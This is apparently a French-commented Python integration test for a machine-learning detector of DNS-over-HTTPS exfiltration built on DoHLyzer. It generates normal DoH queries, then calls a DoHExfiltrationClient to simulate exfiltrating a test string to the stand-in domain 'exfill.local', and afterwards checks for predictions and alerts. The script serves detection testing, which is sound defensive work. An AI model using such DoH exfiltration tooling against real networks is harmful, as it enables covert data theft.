#!/usr/bin/env python3
"""
Test Script pour ML Analyzer

Script pour tester la couche d'analyse ML avec DoHLyzer
"""

import os
import sys
import time
import logging
import requests
import subprocess
from pathlib import Path

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

def test_ml_analyzer_integration():
    """Test int√©gral de la couche ML analyzer"""
    
    logger.info("üß™ Test d'int√©gration ML Analyzer")
    
    # 1. V√©rifier que les services sont up
    logger.info("1Ô∏è‚É£ V√©rification des services...")
    
    # 2. G√©n√©rer du trafic de test
    logger.info("2Ô∏è‚É£ G√©n√©ration de trafic de test...")
    generate_test_traffic()
    
    # 3. Attendre l'analyse
    logger.info("3Ô∏è‚É£ Attente de l'analyse DoHLyzer...")
    time.sleep(60)  # Laisser le temps √† DoHLyzer d'analyser
    
    # 4. V√©rifier les r√©sultats
    logger.info("4Ô∏è‚É£ V√©rification des r√©sultats...")
    check_analysis_results()
    
    logger.info("‚úÖ Test d'int√©gration termin√©")

def generate_test_traffic():
    """G√©n√®re du trafic de test pour l'analyse"""
    try:
        # Trafic normal
        logger.info("üì° G√©n√©ration de trafic normal...")
        for i in range(10):
            try:
                requests.get("https://doh.local/dns-query", 
                           params={"name": f"test{i}.example.com", "type": "A"},
                           timeout=5, verify=False)
            except:
                pass  # Ignorer les erreurs
            time.sleep(1)
        
        # Trafic d'exfiltration (simul√©)
        logger.info("üéØ G√©n√©ration de trafic d'exfiltration...")
        try:
            from client import DoHExfiltrationClient, ExfiltrationConfig
            
            config = ExfiltrationConfig(
                doh_server="https://doh.local/dns-query",
                target_domain="exfill.local",
                chunk_size=25,
                base_delay=0.5
            )
            
            client = DoHExfiltrationClient(config)
            test_data = b"ML test data for analysis and detection"
            client.exfiltrate_data(test_data, "ml_test")
        except ImportError:
            logger.warning("Client d'exfiltration non disponible")
        
    except Exception as e:
        logger.error(f"‚ùå Erreur g√©n√©ration trafic: {e}")

def check_analysis_results():
    """V√©rifie que l'analyse ML a produit des r√©sultats"""
    analysis_dir = Path("/app/analysis")
    
    if not analysis_dir.exists():
        logger.warning("‚ö†Ô∏è R√©pertoire d'analyse non trouv√©")
        return
    
    # V√©rifier les fichiers DoHLyzer
    dohlyzer_dir = analysis_dir / "raw_dohlyzer"
    if dohlyzer_dir.exists():
        dohlyzer_files = list(dohlyzer_dir.glob("*.json"))
        logger.info(f"üìä Fichiers DoHLyzer g√©n√©r√©s: {len(dohlyzer_files)}")
    
    # V√©rifier les CSVs ML
    csv_dir = analysis_dir / "ml_ready_csv"
    if csv_dir.exists():
        csv_files = list(csv_dir.glob("*.csv"))
        logger.info(f"üìä Fichiers CSV ML g√©n√©r√©s: {len(csv_files)}")
    
    # V√©rifier les pr√©dictions
    pred_dir = analysis_dir / "predictions"
    if pred_dir.exists():
        prediction_files = list(pred_dir.glob("*.csv"))
        logger.info(f"ü§ñ Fichiers de pr√©dictions: {len(prediction_files)}")
        
        # V√©rifier les alertes
        alert_files = list(pred_dir.glob("alert_*.json"))
        logger.info(f"üö® Alertes g√©n√©r√©es: {len(alert_files)}")
    
    # R√©sum√©
    if csv_dir.exists() and list(csv_dir.glob("*.csv")):
        logger.info("‚úÖ Analyse ML fonctionnelle")
    else:
        logger.warning("‚ö†Ô∏è Aucun fichier CSV ML g√©n√©r√©")

if __name__ == "__main__":
    test_ml_analyzer_integration()
